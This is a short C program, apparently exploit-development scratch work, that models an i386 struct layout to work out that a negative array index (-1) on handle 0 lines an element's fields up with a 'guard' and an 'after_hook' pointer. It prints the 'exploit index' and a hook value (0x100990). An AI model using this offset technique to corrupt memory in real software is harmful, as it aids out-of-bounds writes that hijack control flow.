/* i386-faithful layout model: pointers are uint32 so alignment matches the kernel. */
#include <stdio.h>
#include <stdint.h>
#include <stddef.h>
#define SVAL_LEN 48
#define ARR_CAP 48
#define MAX_ARRAYS 24
typedef struct { int type; int ival; char sval[SVAL_LEN]; } val_t;
typedef struct { int used; int len; val_t elems[ARR_CAP]; } arr_t;
static struct { uint32_t guard; uint32_t after_hook; uint8_t pad[40]; arr_t pool[MAX_ARRAYS]; } sc;
int main(void) {
    printf("sizeof(val_t)=%zu sizeof(arr_t)=%zu\n", sizeof(val_t), sizeof(arr_t));
    printf("guard@%zu after_hook@%zu pool@%zu pool[0].elems@%zu\n",
           offsetof(typeof(sc),guard), offsetof(typeof(sc),after_hook),
           offsetof(typeof(sc),pool), offsetof(typeof(sc),pool)+offsetof(arr_t,elems));
    long base = (long)&sc.pool[0].elems[0];
    printf("&pool[0].elems[-1] - &sc = %ld   (want 0 -> type on guard, ival on after_hook)\n",
           (base - 1*(long)sizeof(val_t)) - (long)&sc);
    printf("=> i386 exploit index for handle 0 is i = -1; hook value = 0x%X = %u\n",
           0x100990u, 0x100990u);
    return 0;
}
